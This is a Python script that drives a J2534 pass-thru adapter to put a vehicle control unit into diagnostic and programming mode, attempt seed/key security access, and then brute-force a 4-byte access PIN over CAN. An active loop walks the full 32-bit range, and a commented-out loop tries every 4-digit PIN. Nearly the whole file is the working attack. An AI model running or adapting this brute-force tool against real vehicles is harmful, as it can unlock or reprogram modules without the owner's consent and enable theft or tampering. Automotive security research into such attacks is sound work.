import os
from ctypes import *

import J2534
from J2534.Define import *
from Common import *
import Config as cfg

## ----------------------------------------- MAIN CODE ----------------------------------------- ##

deviceID = device_open(cfg.devIndex)

powerCycle(deviceID, powerOffPause, powerOnPause)

## -------------------------------- ISO Proto init / Get VIN ----------------------------------- ##

protocolID, channelID, filterID = ISO15765_Connect(deviceID, cfg.reqCANId, cfg.rspCANId)

## -------------------------------- Unlock access ----------------------------------- ##

# SW_PS_HVWakeup(deviceID)

# protocolID = ProtocolID.SW_CAN_PS
# ret, channelID = J2534.ptConnect(deviceID, protocolID, 0x00000800, BaudRate.B33K)
# print(dtn(), '[ CAN Connected ]')

# SW_PS_SetConfig(channelID, addLoopback=False)

# ret, filterID = CAN_SetFilter(protocolID, channelID, cfg.reqCANId, cfg.rspCANId)

# #send(protocolID, channelID, cfg.reqCANId, [0x02, 0x10, 0x02], skipTillMsgNum=3)
# #send(protocolID, channelID, cfg.reqCANId, [0x01, 0x28], skipTillMsgNum=3)

# clrb(channelID)
# J2534.ptStopMsgFilter(channelID, filterID)
# J2534.ptDisconnect(channelID)

##############################################################

# protocolID = ProtocolID.SW_ISO15765_PS
# ret, channelID = J2534.ptConnect(deviceID, protocolID, 0x00000000, BaudRate.B33K)
# print(dtn(), '[ SW_ISO15765_PS Connected ]')

##############################################################

#SW_PS_SetConfig(channelID)

# ## -------------------------------------- CAN Proto init --------------------------------------- ##

# protocolID = ProtocolID.CAN
# ret, channelID = J2534.ptConnect(deviceID, protocolID, 0x00000800, BaudRate.B500K)
# print(dtn(), '[ CAN Connected ]')

# CAN_SetFilter(protocolID, channelID, cfg.reqCANId, cfg.rspCANId)

## -------------------------------------- Authenticate --------------------------------------- ##

powerOff(deviceID)

def Initialize(deviceID, protocolID, channelID):
    powerOn(deviceID)

    print(dtn(), 'Start diagnostic session')
    if not startDiag(protocolID, channelID, cfg.reqCANId, cfg.rspCANId):
        quit(-1)

    print(dtn(), 'Disable communications')
    if not disableComm(protocolID, channelID, cfg.reqCANId, cfg.rspCANId):
        quit(-1)

    print(dtn(), 'Request programming mode')
    if not ProgrammingMode_requestProgrammingMode(protocolID, channelID, cfg.reqCANId, cfg.rspCANId):
        quit(-1)

    print(dtn(), 'Enable programming mode')
    if not ProgrammingMode_enableProgrammingMode(protocolID, channelID, cfg.reqCANId, cfg.rspCANId):
        quit(-1)

    seed = askSeed2(protocolID, channelID, cfg.reqCANId, cfg.rspCANId, cfg.requestSeed)
    tryKey2(protocolID, channelID, cfg.reqCANId, cfg.rspCANId, cfg.sendKey, cfg.keys[cfg.sendKey])

def Shutdown(deviceID):
    powerOff(deviceID)

Initialize(deviceID, protocolID, channelID)

# # Brute force only digit PINs: 0000 - 9999
# start_time = time.time()
# total_iterations = 10000
# for i in range(0, total_iterations):
#     pin = f'{i:04}'
#     print(dtn(), 'PIN: ', pin)

#     #Initialize(deviceID, protocolID, channelID)

#     isPinCorrect = AEMode(protocolID, channelID, cfg.reqCANId, cfg.rspCANId, 0x7E, [0x80, ord(pin[0]), ord(pin[1]), ord(pin[2]), ord(pin[3])])

#     #Shutdown(deviceID)

#     if isPinCorrect:
#         print(dtn(), 'PIN ACCEPTED:', pin)
#         break

#     print_eta(start_time, total_iterations, i, 5) # Print ETA every X iterations

# Brute force all possible range: 00 00 00 00 - FF FF FF FF
start_time = time.time()
total_iterations = 0xFFFFFFFF

for i in range(0x00000000, total_iterations):
    pin = f'{i:08x}'
    print(dtn(), 'PIN: ', pin)

    #Initialize(deviceID, protocolID, channelID)

    isPinCorrect = AEMode(protocolID, channelID, cfg.reqCANId, cfg.rspCANId, 0x7E, [0x80] + list(i.to_bytes(4, 'big', signed=False)))

    #Shutdown(deviceID)

    if isPinCorrect:
        print(dtn(), 'PIN ACCEPTED:', pin)
        break

    print_eta(start_time, total_iterations, i, 5) # Print ETA every X iterations

Shutdown(deviceID)

clrb(channelID)
J2534.ptStopMsgFilter(channelID, filterID)
J2534.ptDisconnect(channelID)
J2534.ptClose(deviceID)
